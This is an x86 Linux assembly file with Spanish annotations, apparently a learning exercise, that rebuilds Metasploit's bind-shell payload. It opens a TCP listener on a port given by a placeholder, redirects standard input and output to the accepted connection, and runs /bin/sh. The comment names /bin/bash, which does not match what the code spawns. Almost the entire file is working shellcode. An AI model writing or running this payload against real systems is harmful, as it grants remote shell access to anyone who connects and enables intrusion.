; Bind_Shell.nasm
; NASM code obtain from: msfvenom -p linux/x86/shell_bind_tcp LPORT=* EXITFUNC=THREAD -f raw | ndisasm -u -
; Author: MrSquid



global _start ;Para definir donde arranca 

section .text

_start:         ;Usamos como referencia bind_shell.py
	;s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
	;
	; 
	xor ebx,ebx
	mul ebx
	push ebx
	inc ebx
	push ebx
	push byte +0x2
	mov ecx,esp
	mov al,0x66
	int 0x80
	
	;s.bind(('', port)) 
	pop ebx
	pop esi
	push edx
	push dword PORT ;Aqui esta metiendo el puerto 
	push dword 0002
	push byte +0x10
	push ecx
	push eax
	mov ecx,esp
	push byte +0x66 ;Aqui llama a socketcall (man 2 socketcall)
	pop eax
	int 0x80

	;s.listen(1)
	mov [ecx+0x4],eax
	mov bl,0x4
	mov al,0x66
	int 0x80
	
	;(rem, addr) = s.accept()	
	inc ebx
	mov al,0x66
	int 0x80
	xchg eax,ebx
	pop ecx
	dup:
		push byte +0x3f ;63 en entero
		pop eax
		;os.dup2(rem.fileno(),0) #Aqui redirige STDIN,STOUD and STDERR hacia la consolo abierta via TCP
	    	;os.dup2(rem.fileno(),1)
	    	;os.dup2(rem.fileno(),2)
		int 0x80
		dec ecx
		jns dup

	;pty.spawn("/bin/bash") #Ejecuta la shell

	push dword 0x68732f2f ;pty.spawn("/bin/bash")
	push dword 0x6e69622f
	mov ebx,esp
	push eax
	push ebx
	mov ecx,esp
	mov al,0xb
	int 0x80

